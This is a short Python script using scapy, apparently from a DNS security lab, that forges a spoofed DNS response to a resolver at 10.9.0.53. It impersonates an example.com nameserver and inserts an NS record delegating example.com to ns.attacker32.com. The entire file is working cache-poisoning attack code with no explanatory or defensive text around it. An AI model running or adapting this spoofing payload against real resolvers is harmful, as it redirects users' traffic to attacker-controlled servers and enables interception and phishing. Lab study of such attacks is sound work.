#!/usr/bin/env python3
from scapy.all import *
# attacker queries the DNS Server Apollo for a non-existing name in example.com
name = "twysw.example.com"
domain = "example.com"
ns = "ns.attacker32.com"
Qdsec = DNSQR(qname=name)
# provide an IP resolution for twysw.example.com, 
Anssec = DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
# provides an “Authoritative Nameservers” record, indicating ns.attacker32.com as the nameserver for the example.com domain.
NSsec = DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
qdcount=1, ancount=1, nscount=1, arcount=0,
qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst="10.9.0.53", src="199.43.133.53")
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns

send(reply)
